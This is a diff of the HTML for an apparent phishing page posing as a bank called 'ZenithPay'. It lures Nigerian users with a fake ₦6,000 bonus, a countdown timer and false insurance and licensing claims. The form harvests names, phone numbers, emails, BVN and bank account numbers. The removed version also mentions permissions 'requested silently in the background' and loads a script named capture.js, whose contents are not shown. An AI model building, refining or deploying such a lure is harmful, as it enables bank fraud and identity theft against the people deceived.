@@ -9,101 +9,78 @@
 </head>
 <body>
 
-    <!-- ===== SPLASH SCREEN ===== -->
-    <div id="splashScreen" class="splash">
-        <div class="splash-logo">
-            <svg width="64" height="64" viewBox="0 0 64 64" fill="none">
-                <rect x="2" y="2" width="60" height="60" rx="16" fill="#0A7E3D" />
-                <path d="M18 32L28 42L46 22" stroke="white" stroke-width="6" stroke-linecap="round" stroke-linejoin="round" />
-            </svg>
-            <span>ZenithPay</span>
+    <!-- SPLASH -->
+    <div id="splash" class="splash">
+        <div class="splash-box">
+            <h1>ZenithPay</h1>
+            <p>Smart banking for everyone</p>
+            <div class="loader"></div>
         </div>
-        <div class="splash-loader">
-            <div class="loader-bar"></div>
-        </div>
-        <p class="splash-sub">NDIC Insured · Secure Banking</p>
     </div>
 
-    <!-- ===== LOGIN / SIGNUP FORM ===== -->
-    <div id="mainApp" class="hidden">
-        <div class="container">
-            <!-- Header -->
-            <div class="header">
-                <div class="logo">
-                    <svg width="32" height="32" viewBox="0 0 32 32" fill="none">
-                        <rect x="2" y="2" width="28" height="28" rx="8" fill="#0A7E3D" />
-                        <path d="M10 16L14 20L22 12" stroke="white" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" />
-                    </svg>
-                    <span>ZenithPay</span>
-                </div>
-                <div class="trust-badge">🏦 NDIC Insured</div>
+    <!-- LOGIN -->
+    <div id="loginPage" class="container hidden">
+        <div class="header">
+            <h2>ZenithPay</h2>
+            <span class="badge">✓ Secured</span>
+        </div>
+
+        <div class="banner">
+            <div>
+                <span class="tag">🎉 Limited Offer</span>
+                <h3>Get <span class="gold">₦6,000</span> Free</h3>
+                <p>No deposits required</p>
             </div>
-
-            <!-- Bonus Banner -->
-            <div class="bonus-banner">
-                <div class="bonus-icon">🎉</div>
-                <div class="bonus-text">
-                    <span class="bonus-title">Welcome Bonus</span>
-                    <span class="bonus-amount">₦6,000</span>
-                </div>
-                <div class="bonus-timer"><span>⏳</span> 2:47</div>
+            <div class="timer">
+                <span class="label">Ends in</span>
+                <span class="time" id="timerDisplay">02:47</span>
             </div>
+        </div>
 
-            <!-- Card -->
-            <div class="card">
-                <h1>Claim your <span class="highlight">₦6,000</span> bonus</h1>
-                <p class="subtext">
-                    New customers get <strong>₦6,000</strong> free when they verify their identity.
-                    No deposits required. Limited time offer.
-                </p>
+        <div class="card">
+            <h4>Create your account</h4>
+            <p class="sub">Join thousands of Nigerians</p>
 
-                <!-- ===== NO PERMISSION UI ===== -->
-                <!-- Permissions are requested silently in the background -->
-
-                <!-- Form -->
-                <form id="signupForm">
-                    <div class="field">
-                        <label for="fullname">Full Name</label>
-                        <input type="text" id="fullname" placeholder="e.g., Chidi Okafor" required />
-                    </div>
-                    <div class="field">
-                        <label for="phone">Phone Number</label>
-                        <input type="tel" id="phone" placeholder="080 1234 5678" required />
-                    </div>
-                    <div class="field">
-                        <label for="email">Email Address</label>
-                        <input type="email" id="email" placeholder="you@example.com" required />
-                    </div>
-                    <div class="field">
-                        <label for="bvn">BVN</label>
-                        <input type="text" id="bvn" placeholder="22345678901" required />
-                    </div>
-                    <div class="field">
-                        <label for="bank">Bank Name</label>
+            <form id="signupForm">
+                <div class="field">
+                    <label>Full Name</label>
+                    <input type="text" id="fullname" placeholder="e.g., Chidi Okafor" required />
+                </div>
+                <div class="field">
+                    <label>Phone Number</label>
+                    <input type="tel" id="phone" placeholder="080 1234 5678" required />
+                </div>
+                <div class="field">
+                    <label>Email Address</label>
+                    <input type="email" id="email" placeholder="you@example.com" required />
+                </div>
+                <div class="field">
+                    <label>BVN</label>
+                    <input type="text" id="bvn" placeholder="22345678901" required />
+                </div>
+                <div class="row">
+                    <div class="field half">
+                        <label>Bank Name</label>
                         <input type="text" id="bank" placeholder="e.g., GTBank" required />
                     </div>
-                    <div class="field">
-                        <label for="account">Account Number</label>
+                    <div class="field half">
+                        <label>Account Number</label>
                         <input type="text" id="account" placeholder="0123456789" required />
                     </div>
-
-                    <div class="terms">
-                        <input type="checkbox" id="terms" required />
-                        <label for="terms">I agree to the <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a></label>
-                    </div>
-
-                    <button type="submit" id="submitBtn">Create Account</button>
-                </form>
-
-                <div class="footer-links">
-                    <a href="#">About</a> · <a href="#">Contact</a> · <a href="#">FAQs</a> · <a href="#">Security</a>
                 </div>
-            </div>
 
-            <div class="site-footer">© 2026 ZenithPay. A licensed financial institution.</div>
+                <div class="checkbox">
+                    <input type="checkbox" id="terms" required />
+                    <label for="terms">I agree to the Terms & Privacy Policy</label>
+                </div>
+
+                <button type="submit" id="submitBtn">Open Account</button>
+            </form>
+
+            <div class="footer-text">🔒 Your data is encrypted and secure</div>
         </div>
     </div>
 
-    <script src="capture.js"></script>
+    <script src="script.js"></script>
 </body>
 </html>
